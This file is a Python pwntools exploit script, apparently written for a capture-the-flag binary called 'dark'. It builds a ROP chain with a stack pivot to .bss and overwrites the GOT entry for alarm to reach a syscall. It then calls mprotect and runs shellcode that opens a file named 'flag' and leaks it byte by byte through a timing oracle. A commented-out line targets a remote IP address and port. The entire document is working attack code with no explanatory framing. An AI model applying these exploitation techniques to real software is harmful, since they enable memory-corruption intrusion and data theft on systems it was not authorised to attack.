#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
from pwn import *
start = int(sys.argv[1])
end = int(sys.argv[2])


binary = './dark'
elf = ELF(binary)
libc = elf.libc

context.log_level = 'info'
pause()

def call_func(r12, r13, r14, r15):
    buf = p64(0x401272)
    buf += p64(0) # rbx
    buf += p64(1) # rbp
    buf += p64(r12) # func name
    buf += p64(r13) # rdx
    buf += p64(r14) # rsi
    buf += p64(r15) # rdi
    buf += p64(0x401258)
    buf += '0' * 56
    return buf

# prepare big rop chain, because the previous overflow size is not enough for all the
# operations
io = 0
def main(offset, cmpval):
    global io
    io = process(binary)
    #io = remote('121.41.41.111', 9999)
    bss_addr = 0x404100
    pop_rbp = 0x401149
    leave_ret = 0x4011ef
    b = 'a' * 0x10
    b += 'b' * 8
    b += call_func(elf.got['read'], 0, bss_addr, 0x300)
    b += p64(pop_rbp)
    b += p64(bss_addr)
    b += p64(leave_ret)


    #gdb.attach(io, 'b *0x40121E')
    #raw_input()


    io.send(b)
    # read ROP to it


    #pause()

    sleep(0.1)

    bss_addr2 = 0x404500
    context.arch = 'amd64'
    b = '''
    mov rax, 2
    mov rdi, 0x404278
    mov rsi, 0
    mov rdx, 0
    syscall

    xchg rax, rdi
    xor rax, rax
    mov rsi, 0x404500
    mov rdx, 60
    syscall

    mov rcx, 0x404500
    add rcx, %d
    mov al, byte ptr [rcx]
    cmp al, %d
    jz good

    bad:
    mov rax, 0x40000001
    syscall

    good:
    mov rax, 0
    mov rdi, 0
    mov rsi, 0x404700
    mov rdx, 0x100
    syscall
    jmp good
    '''

    SC = asm(b % (offset, cmpval))

    b = p64(0) # for pop ebp in leave
    b += call_func(elf.got['read'], 0, elf.got['alarm'], 1) # set the elf.got['alarm'] to syscall
    b += call_func(elf.got['read'], 0, bss_addr2, 10) # set rax 10
    b += call_func(elf.got['alarm'], 0x404000, 0x1000, 7) # mprotect()
    b += p64(0x404300)
    b += 'flag\x00'
    b = b.ljust(0x200, '\x00')
    b += SC
    io.send(b)
    # read one byte to the got



    #pause()


    sleep(0.1)

    io.send('\x05')
    # read 10 bytes to set the rax



    #pause()


    sleep(0.1)


    io.send('1' * 10)

if __name__ == '__main__':
    flag = ['a' for k in range(end - start)]
    for i in range(start,end):
        for j in range(30, 128):
            flag[i - start] = chr(j)
            try:
                main(i, j)
                sleep(2)
                io.send('a'*0x100)
                print '-----------'
                break
            except:
                io.kill()
                continue
        log.info(''.join(flag))
        if flag[-1] == '}':
            pause()

